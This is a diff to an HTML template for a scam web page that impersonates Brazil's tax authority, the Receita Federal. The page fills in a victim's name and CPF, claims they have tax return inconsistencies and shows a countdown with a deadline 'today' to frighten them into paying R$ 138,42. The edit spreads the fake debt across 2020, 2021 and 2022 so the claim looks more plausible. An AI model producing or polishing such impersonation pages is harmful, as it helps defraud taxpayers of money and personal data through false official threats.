@@ -798,7 +798,7 @@
                 <img src="https://i.ibb.co/xKfzBFbn/download-1.png" alt="User profile icon" class="user-info-image">
             </div>
             <div class="message-box">
-                <p><span class="red-strong">Atenção {{ customer.nome.split()[0] }}:</span> A Receita Federal identificou inconsistências nas suas declarações do Imposto de Renda do exercício de <strong>2020.</strong> O prazo para regularização <span class="red-strong">acaba hoje</span>. Caso não seja regularizado no prazo estabelecido, o contribuinte estará sujeito a todas as penalidades e restrições supracitadas neste documento.</p>
+                <p><span class="red-strong">Atenção {{ customer.nome.split()[0] }}:</span> A Receita Federal identificou inconsistências nas suas declarações do Imposto de Renda dos exercícios de <strong>2020, 2021 e 2022.</strong> O prazo para regularização <span class="red-strong">acaba hoje</span>. Caso não seja regularizado no prazo estabelecido, o contribuinte estará sujeito a todas as penalidades e restrições supracitadas neste documento.</p>
                 <div class="countdown-timer" id="countdown">Tempo restante: 23h 40m 52s</div>
             </div>
             <div class="tax-details">
@@ -809,7 +809,11 @@
                     <dt>CPF:</dt>
                     <dd>{{ customer.cpf }}</dd>
                     <dt>2020:</dt>
-                    <dd>R$ 138,42</dd>
+                    <dd>R$ 46,14</dd>
+                    <dt>2021:</dt>
+                    <dd>R$ 46,14</dd>
+                    <dt>2022:</dt>
+                    <dd>R$ 46,14</dd>
                 </dl>
                 <p class="total-value"><strong>Total devido: R$ 138,42</strong></p>
                 <p>Para regularizar a situação fiscal e evitar a aplicação das penalidades previstas no documento oficial, é obrigatório efetuar o pagamento das divergências calculadas pela Receita Federal no valor total de <strong>R$ 138,42</strong>.</p>
